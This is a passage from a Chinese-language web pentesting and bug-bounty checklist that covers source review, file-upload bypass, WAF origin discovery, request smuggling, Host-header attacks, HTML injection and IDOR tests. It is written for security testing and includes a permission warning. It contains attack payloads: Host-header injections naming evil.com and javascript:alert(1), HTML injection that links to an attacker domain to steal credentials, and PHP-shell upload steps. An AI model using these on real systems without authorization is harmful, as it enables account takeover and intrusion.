<p><a target="_blank" rel="noopener" href="https://kathan19.gitbook.io/howtohunt/checklist/web-application-pentesting-checklist">Web Application Pentesting<br>Checklist</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/CheckList/Web_Checklist_by_Chintan_Gurjar.pdf">Web Checklist by Chintan<br>Gurjar.pdf</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/CheckList/mindmap.png">Mindmap by Rohit<br>Gautam</a><br><a target="_blank" rel="noopener" href="https://github.com/KathanP19/HowToHunt/blob/master/CheckList/Web_Penetration_Testing_Methodology%402x.png">Mindmap by Cristian<br>Cornea</a><br>都挺有用的</p>
</blockquote>
<h3><span id="网页代码审计web-page-source-code-review">网页代码审计（Web Page Source Code Review）</span></h3><h4><span id="重要功能优先">重要功能优先</span></h4><blockquote>
<p>阅读源代码时，请专注于重要功能，例如身份验证，密码重置，状态更改操作和敏感信息读取。（什么是最重要的将取决于应用程序。然后，查看这些组件如何与其他功能交互。最后，审核应用程序的其他不太敏感的部分。</p>
</blockquote>
<h4><span id="跟随用户输入">跟随用户输入</span></h4><blockquote>
<p>另一种方法是遵循处理用户输入的代码。HTTP 请求参数、HTTP 标头、HTTP<br>请求路径、数据库条目、文件读取和文件上传等用户输入为攻击者利用应用程序漏洞提供了入口点。这也可能有助于我们找到一些关键漏洞，如xxe，xxs，sql注入。</p>
</blockquote>
<h4><span id="硬编码的密钥与凭据">硬编码的密钥与凭据</span></h4><blockquote>
<p>在源代码审查期间，可以轻松发现硬编码的机密，例如API密钥，加密密钥和数据库密码。您可以<br>grep<br>查找关键字，例如”key”、”secret”、”password”、”encrypt”或正则表达式，搜索十六进制或<br>base64 字符串（取决于所使用的密钥格式）。</p>
</blockquote>
<h4><span id="使用危险功能和过时的依赖关系">使用危险功能和过时的依赖关系</span></h4><blockquote>
<p>不受控制地使用危险功能和过时的依赖项是错误的巨大来源。Grep<br>以获取您正在使用的语言的特定函数，并搜索依赖项版本列表以查看它们是否过时。</p>
</blockquote>
<h4><span id="开发人员备注-隐藏的调试功能-配置文件和-git-目录">开发人员备注、隐藏的调试功能、配置文件和 .git 目录</span></h4><blockquote>
<p>这些是开发人员经常忘记的事情，它们使应用程序处于危险状态。开发人员的评论可以指出明显的编程错误，隐藏的调试功能通常会导致权限提升，配置文件允许攻击者收集有关您的基础架构的更多信息，最后，公开的.git目录允许攻击者重建您的源代码。</p>
</blockquote>
<h4><span id="隐藏路径-已弃用的端点和开发中的端点">隐藏路径、已弃用的端点和开发中的端点</span></h4><blockquote>
<p>这些是用户在正常使用应用程序时可能不会遇到的点。但是，如果它们有效并且被攻击者发现，则可能导致身份验证绕过和敏感信息泄漏等漏洞，具体取决于暴露的端点。</p>
</blockquote>
<h4><span id="弱密码或散列">弱密码或散列</span></h4><blockquote>
<p>这是一个在黑盒测试期间很难发现的问题，但在审查源代码时很容易发现。查找诸如弱加密密钥、可破解加密算法和弱哈希算法等问题。Grep<br>寻找 ECB、MD4 和 MD5 等术语。</p>
</blockquote>
<h4><span id="缺少对用户输入和正则表达式强度的安全检查">缺少对用户输入和正则表达式强度的安全检查</span></h4><blockquote>
<p>查看源代码是找出缺少哪种安全检查的好方法。通读应用程序的文档，并测试您可以想到的所有边缘情况。对于您应该考虑哪种边缘情况，一个很好的资源是<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a><br>。</p>
</blockquote>
<h4><span id="缺少-cookie-标志">缺少 Cookie 标志</span></h4><blockquote>
<p>注意缺少的 cookie 标志，例如<code>httponly</code>和<code>security</code>。</p>
</blockquote>
<h4><span id="意外行为-条件与不必要的复杂函数">意外行为、条件与不必要的复杂函数</span></h4><blockquote>
<p>此外，还要特别注意应用程序的意外行为、条件和复杂函数。这些位置是经常发现晦涩错误的地方。</p>
</blockquote>
<h3><span id="没有剥离的-exif-地理数据exif-geo-data-not-stripped">没有剥离的 EXIF 地理数据（EXIF Geo Data Not Stripped）</span></h3><h4><span id="介绍">介绍</span></h4><blockquote>
<p>当用户在 example.com<br>上传图像时，上传图像的EXIF地理位置数据不会被剥离。因此，任何人都可以获得<br>example.com<br>用户的敏感信息，例如他们的地理位置，他们的设备信息，例如设备名称，版本，使用的软件和软件版本等。</p>
</blockquote>
<h4><span id="复现步骤">复现步骤</span></h4><blockquote>
<ol>
<li>在<br><a target="_blank" rel="noopener" href="https://github.com/ianare/exif-samples/tree/master/jpg">exif-samples</a><br>上能找到很多不同分辨率及大小的图片；</li>
<li>去一个上传图片的站点，上传 exif-example 中符合规则的图片；</li>
<li>查看上传图片的路径（要么右键单击图片然后复制图片地址，要么右键单击，检查图片，URL将进入检查，将其编辑为html）；</li>
<li>现在用<a target="_blank" rel="noopener" href="http://exif-viewer.com/">Online Exif Viewer</a><br>看看那个图片链接有没有暴露有效信息。</li>
</ol>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/906907">IDOR with Geolocation data not stripped from<br>images</a></li>
</ul>
</blockquote>
<h3><span id="文件上传绕过file-upload-bypass">文件上传绕过（File Upload Bypass）</span></h3><blockquote>
<p>假设有一个限制，你只能以PDF、JPEG、JPG等几种格式上传文件，但如果你可以通过无视这种上传机制和文件类型检查来上传一个PHP文件会如何？<br>如果有人能上传一个PHP文件，那么一旦他上传一个 php<br>shell，就可以轻松的执行 RCE，最不济也能在服务器上获得一个反弹 shell。</p>
</blockquote>
<h4><span id="绕过的原理">绕过的原理</span></h4><blockquote>
<p>这一般取决于系统使用哪种验证，如果他只是对文件的扩展名进行校验，那么绕过他将非常容易。<br>现在假设我们必须上传一个JPG文件，即拓展名必须是 XX.jpg：</p>
</blockquote>
<h4><span id="绕过一般的拓展验证">绕过一般的拓展验证</span></h4><blockquote>
<p>上传一个以 .php.jpg 或 .jpg.php 为拓展名的文件试试</p>
</blockquote>
<h4><span id="绕过魔术字节验证">绕过魔术字节验证</span></h4><blockquote>
<p>在这种绕过中我们使用 polygots.在安全相关文章中，Polyglots<br>是指多语言且多种不同文件类型有效形式的结合。 例如，GIFAR 文件既是一种<br>GIF 又是一种 RAR 文件。也有文件能既是 GIF 又是 JS，既是 PPT 又是 JS<br>等等。</p>
<p>所以当我们被要求要上传一个 JPEG 类型的文件时我们可以上传一个 PHAR-JPEG<br>文件，因为 PHAR-JPEG 文件同时具有 JPEG 标头和 PHP<br>文件内容，在验证时会被视为 JPEG 文件，稍做处理后可被作为 PHP<br>文件被利用。<br>但是，如果你没有网站文件上传测试的许可，请不要进行文件上传测试，除非你想进行恶意行为（文件上传将留有痕迹和脏数据，这是服务器不想承受的，所以没有许可就不要试了，也没钱拿）。</p>
</blockquote>
<h4><span id="绕过步骤">绕过步骤</span></h4><blockquote>
<ol>
<li>创建具有应用程序接受拓展名的恶意文件；</li>
<li>上传该文件后，确认（发送）；</li>
<li>在 Burpsuite<br>中捕获请求，将文件拓展名修改为所需的恶意拓展名，某些情况下你可能还需需要修改文件的内容类型；</li>
<li>将请求转发至服务器，看看响应状态，在页面尝试触发恶意文件。</li>
</ol>
<ul>
<li>参考<br><a target="_blank" rel="noopener" href="https://github.com/jonaslejon/malicious-pdf">malicious-pdf</a> -<br>恶意 PDF 生成器</li>
</ul>
</blockquote>
<h3><span id="溯源find-origin">溯源（Find Origin）</span></h3><h4><span id="验证-waf">验证 WAF</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig +short example.com</span><br><span class="line">curl -s https://ipinfo.io/IP | jq -r <span class="string">&#x27;.org&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>借助 AWS，你通常可以识别存在<code>AWSLB</code>和<code>AWSLBCORS</code> Cookie 的负载均衡器</p>
</blockquote>
<h4><span id="确定来源">确定来源</span></h4><blockquote>
<p>用<a target="_blank" rel="noopener" href="https://dnsdumpster.com/">dnsdumpster</a> 可以生成域名地图<br>接下来用<a target="_blank" rel="noopener" href="https://censys.io/">Censys</a><br>进行搜索，并将看起来与目标匹配的ip保存在文本文件中。如<code>https://censys.io/ipv4?q=0x00sec.org</code><br>找到与域绑定的IP的另一种方法是查看其历史IP。可以用<a target="_blank" rel="noopener" href="https://securitytrails.com/domain/0x00sec.org/dns">SecurityTrails DNS<br>trails</a> 跟踪 *<br>在这里我们能看到存在的A记录及存在的时间。管理员在使用多年的”裸机”后切换到<br>WAF 解决方案是非常常见的，但他们不一定会配置白名单。 *<br>你可以把输出的结果表格整个复制保存在txt中，然后用一下 awk 过滤出 ip：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E -o <span class="string">&quot;([0-9]&#123;1,3&#125;[\\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> tails.txt | <span class="built_in">sort</span> -u | <span class="built_in">tee</span> -a ips.txt</span><br></pre></td></tr></table></figure>

<h4><span id="域名系统枚举">域名系统枚举</span></h4><blockquote>
<p>如果枚举目标<br>DNS，你有可能发现他们具有类似<code>dev.example.com</code>或<code>staging.example.com</code>子域的内容，并且它可能指向没有<br>WAF 的源主机</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Get all the subdomains.</span><br><span class="line">    `subfinder -silent -d 0x00sec.org | dnsprobe -silent | awk  <span class="string">&#x27;&#123; print $2 &#125;&#x27;</span>  | <span class="built_in">sort</span> -u | <span class="built_in">tee</span> -a ips.txt`</span><br></pre></td></tr></table></figure>

<h4><span id="检查主机ip">检查主机IP</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(<span class="built_in">cat</span> ips.txt) <span class="comment"># iterate through each line in file</span></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    org=$(curl -s &lt;https://ipinfo.io/<span class="variable">$ip</span>&gt; | jq -r <span class="string">&#x27;.org&#x27;</span>) <span class="comment">#  Get Org from IPInfo</span></span><br><span class="line">  title=$(<span class="built_in">timeout</span> 2 curl -s -k -H <span class="string">&quot;Host: 0x00sec.org&quot;</span> &lt;https://<span class="variable">$ip</span>/&gt; | pup <span class="string">&#x27;title text&#123;&#125;&#x27;</span>) <span class="comment"># Get title</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;IP: <span class="variable">$ip</span> Title: <span class="variable">$title</span> Org: <span class="variable">$org</span>&quot;</span> <span class="comment"># Print results</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这样我们就能大致快速浏览出哪个IP对应哪个 Host header，并且知道标题<br>我们遍历了每个主机，直接用 host header 请求IP，且我们有我们的源IP</p>
</blockquote>
<h4><span id="手动设置-host-header">手动设置 Host Header</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -k -H <span class="string">&quot;Host: 0x00sec.org&quot;</span> https://&lt;ip address&gt;/</span><br></pre></td></tr></table></figure>

<blockquote>
<p>或者直接在 Burpsuite 中设置 Host Header</p>
</blockquote>
<h4><span id="cloudfail">CloudFail</span></h4><pre><code>git clone &lt;https://github.com/m0rtem/CloudFail.git&gt;
cd CloudFail
pip install -r requirements.txt
python3 cloudfail.py -t 0x00sec.org
</code></pre>
<h4><span id="事先侦察">事先侦察</span></h4><blockquote>
<p>一般的侦察过程是为了尽可能的获得更多的ip地址（host, nslookup, whois,<br>ranges…），然后检查哪些服务器启用了 Web 服务（netcat, nmap,<br>masscan） 一旦拥有了这些 Web<br>服务器的IP列表后，下一步就是检查其中一个服务器上的受保护域是否配置为虚拟主机</p>
</blockquote>
<h4><span id="censys">Censys</span></h4><blockquote>
<p>在选择输入中选择<code>Certificates</code>，提供目标域，然后点击<code>\</code><br>你应该会看到适合你目标的证书列表<br>单机每个结果以显示详细信息，然后在最右侧的<code>Explore</code>菜单中选择<code>IPv4 Hosts</code><br>你应该能够看到使用证书的服务器的IP地址<br>从这里开始，获取所有可能的IP，然后回到上一节，尝试通过所有这些IP访问你的目标：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -k -H <span class="string">&quot;Host: 0x00sec.org&quot;</span> https://&lt;ip address&gt;/</span><br></pre></td></tr></table></figure>

<h4><span id="邮件头">邮件头</span></h4><blockquote>
<p>下一步是检索目标发出的邮件中的标题：订阅新闻通讯、创建账户、使用”忘记密码”功能、订购某些东西……简而言之，尽一切努力从你正在测试的网站获取电子邮件<br>收到电子邮件后，请检查来源，尤其是标题。记录你可以在那里找到的所有IP，以及可能属于托管服务的子域。然后，再次尝试通过所有这些来访问你的目标。<br><a target="_blank" rel="noopener" href="https://www.postmastery.com/about-the-return-path-header/">The value of header Return-Path worked pretty<br>well</a></p>
<ul>
<li>参考 <a target="_blank" rel="noopener" href="https://delta.navisec.io/a-pentesters-guide-part-5-unmasking-wafs-and-finding-the-source/">溯源（Find<br>Origin）实现上部分</a><br><a target="_blank" rel="noopener" href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/">溯源（Find<br>Origin）实现下部分</a></li>
</ul>
</blockquote>
<h3><span id="graphql">GraphQL</span></h3><h4><span id="videos">Videos</span></h4><blockquote>
<p>GraphQL Video -<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GlvNwhq-uBg">InsiderPhd</a> <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=NPDp7GHmMa0">REST in<br>Peace: Abusing GraphQL to Attack Underlying Infrastructure - LevelUp<br>0x05</a></p>
</blockquote>
<h4><span id="blogs">Blogs</span></h4><blockquote>
<p>Exploit GraphQL - <a target="_blank" rel="noopener" href="https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/">Yeswehack<br>Blog</a><br>Hacking GraphQL -<br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-1-understanding-graphql-basics-72bb3dd22efa">Part1</a><br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/hacking-graphql-for-fun-and-profit-part-2-methodology-and-examples-5992093bcc24">Part2</a><br><a target="_blank" rel="noopener" href="https://blog.doyensec.com/2021/05/20/graphql-csrf.html">That single GraphQL issue that you keep<br>missing</a><br><a target="_blank" rel="noopener" href="https://swizec.com/blog/reverse-engineer-a-graphql-api-to-automate-love-notes-codewithswiz-24/">Reverse engineer a GraphQL<br>API</a><br><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2021/08/29/exploiting-graphql/">Exploit<br>GraphQL</a><br><a target="_blank" rel="noopener" href="https://twitter.com/holybugx/status/1441460070387261440?s=21">GraphQL Resources<br>Thread</a></p>
</blockquote>
<h4><span id="tools">Tools</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://ivangoncharov.github.io/graphql-voyager/">GraphQL Voyager</a><br><a target="_blank" rel="noopener" href="https://devhints.io/graphql">GraphQL Cheatsheet</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=JJmufWfVvyU">AutoGraphQL</a><br><a target="_blank" rel="noopener" href="https://github.com/dolevf/graphw00f">graphw00f</a> <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f">InQL - Introspection<br>GraphQL<br>Scanner</a></p>
</blockquote>
<h4><span id="labs">Labs</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn-Vulnerable-GraphQL-Application</a></p>
</blockquote>
<h3><span id="http-走私漏洞http_desync-attack">HTTP 走私漏洞（HTTP_Desync Attack）</span></h3><h4><span id="基础概念">基础概念</span></h4><blockquote>
<p>HTTP 请求夹带攻击是一种干扰站点处理从一个或多个用户接收 HTTP<br>请求队列的技术。请求夹带攻击通常十分严重，它允许攻击者绕过安全控制、未经授权访问敏感数据并直接危害其他应用程序用户。</p>
</blockquote>
<h4><span id="攻击位置">攻击位置</span></h4><blockquote>
<p>任何端点都有可能受到 HTTP 走私攻击（数据接收不同步攻击）<br>你也可以在非端点上寻找漏洞，但敏感端点收到的影响明显更高</p>
<ul>
<li><p>第一步： 利用 Burpsuite 的 Repeater 模块，尝试寻找各种基于时间的<br>payload 去确认漏洞是否存在：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/finding">Find the<br>Vulnerability</a></p>
</li>
<li><p>第二步： 一旦你成功发现了 BUG，你可以尝试用任何 EXP<br>链接它，如通过窃取会话 id 接管账户，在 User-Agent Header 使用 XSS<br>攻击等：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting the<br>Vulnerability</a></p>
</li>
</ul>
</blockquote>
<h4><span id="实用工具">实用工具</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/defparam/smuggler">defparam’s_smuggler.py</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Smuggler.py :</span><br><span class="line"><span class="built_in">cat</span> alive_urls.txt | python3 smuggler.py -m GET/POST <span class="comment">#either GET or POST</span></span><br><span class="line">OR</span><br><span class="line">python3 smuggler.py -u https://example.com -m GET/POST</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/PortSwigger/http-request-smuggler">Burp_smuggler</a></p>
</blockquote>
<h4><span id="topics">Topics</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1049/">Protocol Layer Attack - HTTP Request<br>Smuggling</a> <a target="_blank" rel="noopener" href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">HTTP Desync Attacks:<br>Request Smuggling<br>Reborn</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">HTTP request<br>smuggling</a></p>
</blockquote>
<h4><span id="reports">Reports</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/737140">Mass account takeovers using HTTP Request Smuggling on<br>https://slackb.com/ to steal session<br>cookies</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/867952">HTTP request<br>Smuggling</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/498052">Password theft<br>login.newrelic.com via Request<br>Smuggling</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/526880">Request smuggling on<br>████████</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/771666">Stealing Zomato<br>X-Access-Token: in Bulk using HTTP Request Smuggling on<br>api.zomato.com</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/753939">HTTP SMUGGLING<br>EXPOSED HMAC&#x2F;DOS</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/648434">Multiple HTTP<br>Smuggling reports</a> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/740037">Request<br>smuggling on admin-official.line.me could lead to account<br>takeover</a></p>
</blockquote>
<h4><span id="writeups">Writeups</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://ricardoiramar.medium.com/the-powerful-http-request-smuggling-af208fafa142">The Powerful HTTP Request<br>Smuggling</a><br><a target="_blank" rel="noopener" href="https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4">HTTP Request Smuggling in Plain<br>English</a><br><a target="_blank" rel="noopener" href="https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d">Write up of two HTTP Requests<br>Smuggling</a><br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca">Crossing The Borders : The illegal trade of HTTP<br>requests</a></p>
</blockquote>
<h4><span id="extra">Extra</span></h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=gzM4wWA7RFo">HTTP Request Smuggling mass account<br>takeover</a></p>
</blockquote>
<h3><span id="host-header-attack">Host-Header Attack</span></h3><h4><span id="host-header-摘要">Host Header 摘要</span></h4><blockquote>
<p><img src="https://pbs.twimg.com/media/ET39wJOWoAAfTBb?format=jpg&name=small" alt="image"></p>
</blockquote>
<h4><span id="在测试试也要注意这些">在测试试也要注意这些</span></h4><blockquote>
<p>1.在请求中再添加一个 <code>Host:</code> 2.尝试加入这些 Header：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Original-Url:</span><br><span class="line">X-Forwarded-Server:</span><br><span class="line">X-Host:</span><br><span class="line">X-Forwarded-**Host**:</span><br><span class="line">X-Rewrite-Url:</span><br></pre></td></tr></table></figure>

<blockquote>
<p>3.如果你在任何 AEM 实例中查找攻击点时，遇到<code>api.json</code>，可以通过以下<br>Header 尝试 Web 缓存中毒：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host:</span><br><span class="line">X-Forwarded-Server:</span><br><span class="line">X-Forwarded-Host:</span><br><span class="line">https://localhost/api.json HTTP/1.1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>4.也可以试试 <code>Host: redacted.com.evil.com</code> 5.试试<br><code>Host: evil.com/redacted.com</code> <a target="_blank" rel="noopener" href="https://hackerone.com/reports/317476">Account Takeover in Periscope<br>TV</a> 6.再来<br><code>Host: example.com?.mavenlink.com</code> 7.还可以试试 XSS<br><code>Host: javascript:alert(1);</code> <a target="_blank" rel="noopener" href="https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">XSS via Host header -<br>www.google.com/cse</a><br>8.<a target="_blank" rel="noopener" href="https://logicbomb.medium.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610">Host Header to<br>Sqli</a><br>9.绕过前端服务器限制并且可以访问隐藏的文件目录：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Rewrite-Url/X-original-url: curl -i -s -k -X <span class="string">&#x27;GET&#x27;</span> -H <span class="string">&#x27;Host: &lt;site&gt;&#x27;</span> -H <span class="string">&#x27;X-rewrite-url: admin/login&#x27;</span> <span class="string">&#x27;https://&lt;site&gt;/&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="html-injection">HTML-Injection</span></h3><h4><span id="摘要">摘要</span></h4><blockquote>
<p>密码重置链接通常指向你的帐户名称，后跟重置链接。如果应用程序允许你使用带有标签或特殊字符的帐户名，或许你该尝试以下注入。</p>
</blockquote>
<h4><span id="步骤">步骤</span></h4><blockquote>
<p>1.创建你的帐户 2.将你的姓名编辑为 <code>&lt;h1&gt;attacker&lt;/h1&gt;</code> 或<br><code>&quot;abc&gt;&lt;h1&gt;attacker&lt;/h1&gt;</code> 并且保存它<br>3.发起一个重置密码请求并且在你的邮箱中验证 4.你将会发现 <code>&lt;h1&gt;</code><br>标签被解析了</p>
<ul>
<li>HTML注入通常被认为只是低到中的威胁，但是你可以通过使用 <code>href</code><br>来增加严重性：</li>
<li><code>&lt;h1&gt;attacker&lt;/h1&gt;&lt;a href=&quot;your-controlled-domain&quot;Click here&lt;/a&gt;</code></li>
<li>你可以将用户重定向到恶意域，并提供伪造的重置密码页面以窃取凭据，还可以提供<br>XSS 页面并窃取用户 cookie 等</li>
</ul>
</blockquote>
<h3><span id="idor">IDOR</span></h3><h4><span id="idor">IDOR</span></h4><blockquote>
<ul>
<li>IDOR<br>的核心是一种访问控制漏洞，其中应用程序依赖于用户提供的输入来直接引用对象。在这种情况下，对象可以是图片、帖子评论、与用户甚至组织内整个部门关联的个人身份信息（PII）</li>
<li>当应用程序根据用户提供的输入提供对象的直接访问时，会发生不安全的直接对象引用。通过此漏洞，攻击者可以直接绕过授权并访问系统中的资源，例如数据库记录或文件。不安全的直接对象引用允许攻击者通过修改用于直接指向对象的参数值来绕过授权并<br>直接访问资源。此类资源可以是属于其他用户的数据库条目、系统中的文件等。</li>
<li>IDOR<br>可以存在于整个应用程序中，因此建议你如果看到ID就测试一下，即使是<br><code>guid</code> 或某种类型的”加密ID”。寻找此ID的潜在泄露（public<br>profile），或寻找遍历点，看看能否利用 Burpsuite Intruder<br>进行测试。</li>
</ul>
</blockquote>
<h4><span id="你可能发现的-idor-类型">你可能发现的 IDOR 类型</span></h4><blockquote>
<p>1.参数值直接用于检索数据库记录：<code>http://foo.bar/somepage?invoice=12345</code><br>2.参数值直接用于在系统中执行操作：<code>http://foo.bar/changepassword?user=someuser</code><br>3.参数值直接用于检索文件系统资源：<code>http://foo.bar/showImage?img=img00011</code><br>4.参数值直接用于访问应用程序功能：<code>http://foo.bar/accessPage?menuitem=12</code></p>
</blockquote>
<h4><span id="测试-idor-手动方法">测试 IDOR - （手动方法）</span></h4><blockquote>
<p>基本步骤： 1.如果可以的话，先创建两个帐户，或枚举用户；<br>2.查看终端节点是私有的还是公共的，是否包含任何类型的 id 类参数；<br>3.尝试更改此参数值为其他用户的参数值，看看是否能以其他用户的身份进行操作。</p>
</blockquote>
<blockquote>
<p>Test-1：将 id 参数添加到没有 id 的请求</p>
</blockquote>
<pre><code>GET /api/MyPictureList → /api/MyPictureList?user_id=&lt;other_user_id&gt;

你可以通过删除或编辑其他对象并查看使用的参数名称来寻找要尝试修改或添加的参数名称
</code></pre>
<blockquote>
<p>Test-2:尝试替换参数名称</p>
</blockquote>
<pre><code>Instead of this:
GET /api/albums?album_id=&lt;album id&gt;

Try This:
GET /api/albums?account_id=&lt;account id&gt;

有一个名为 Paramalyzer 的 Burp 拓展，可以通过记住你传递给服务器的所有参数来方便修改
</code></pre>
<blockquote>
<p>Test-3：为同一个参数提供多个值</p>
</blockquote>
<pre><code>Instead of this:
GET /api/account?id=&lt;your account id&gt; →

Try this:    
GET /api/account?id=&lt;your account id&gt;&amp;id=&lt;admin&#39;s account id&gt;

这也是 HTTP 参数污染的一种，这样的操作可能会让你访问管理员帐户
</code></pre>
<blockquote>
<p>Test-4：在测试 id 类参数时尝试更改 HTTP 的请求方法</p>
</blockquote>
<pre><code>Instead of this:
POST /api/account?id=&lt;your account id&gt; →

Try this:    
PUT /api/account?id=&lt;your account id&gt;

尝试切换 POST 和 PUT，看看是否可以将内容上传到其他用户的个人资料，对于 RESTful 服务，请尝试将 GET 更改为 POST/PUT/DELETE 以进行创建/更新/删除操作
</code></pre>
<blockquote>
<p>Test-5：尝试更改请求的内容类型</p>
</blockquote>
<pre><code>Instead of this:
POST /api/chat/join/123 […] Content-type: application/xml → test

Try this:
POST /api/chat/join/123 […] Content-type: application/json &#123;“user”: “test”&#125;

访问控制在不同内容类型中的实施可能不一致。不要忘记尝试替换或使用不太常见的值，如 text/xml、text/x-json 等
</code></pre>
<blockquote>
<p>Test-6：尝试更改请求的文件类型（测试是否为Ruby）</p>
</blockquote>
<pre><code>Example:

GET /user_data/2341 --&gt; 401 Unauthorized

GET /user_data/2341.json --&gt; 200 OK

通过附加不同的文件扩展名（e.g. .json, .xml, .config）在文件请求的末尾
</code></pre>
<blockquote>
<p>Test-7：应用是否要求非数字 id？将其改为数字 id</p>
</blockquote>
<pre><code>可能有多种方法引用数据库中的对象，并且应用程序仅对一种对象进行访问控制
在接受非数字 id 的任何地方尝试使用数字 id：
Example:

username=user1 → username=1234
account_id=7541A92F-0101-4D1E-BBB0-EB5032FE1686 → account_id=5678
album_id=MyPictures → album_id=12
</code></pre>
<blockquote>
<p>Test-8：尝试使用数组</p>
</blockquote>
<pre><code>如果常规 id 替换不起作用，请尝试将 id 包装在数组中，看看是否可以达成操作：

&#123;“id”:19&#125; → &#123;“id”:[19]&#125;
</code></pre>
<blockquote>
<p>Test-9：通配符 id</p>
</blockquote>
<pre><code>尝试将 id 参数值替换为通配符，你可能会幸运地得到什么：

GET /api/users/&lt;user_id&gt;/ → GET /api/users/*
</code></pre>
<blockquote>
<p>Test-10：注意新功能</p>
</blockquote>
<pre><code>如果你偶然发现 Web 应用中新添加的功能（如即将举行的活动中含有上传个人资料图片的功能），可能会执行 API 调用：

/api/CharityEventFeb2021/user/pp/&lt;ID&gt;

应用程序可能不会像对核心功能那样严格地强制实施此新功能的访问控制
</code></pre>
<blockquote>
<p>IDOR - 自动测试方式： <a target="_blank" rel="noopener" href="https://threat.tevora.com/finding-broken-access-controls/">Finding Broken Access<br>Controls</a><br><a target="_blank" rel="noopener" href="https://blog.yeswehack.com/yeswerhackers/pimpmyburp-pwnfox-autorize-find-idor/">PimpMyBurp #1 - PwnFox + Autorize: The perfect combo to find IDOR -<br>Global Bug Bounty<br>Platform</a><br><a target="_blank" rel="noopener" href="https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8">Automating BURP to find<br>IDORs</a></p>
<ul>
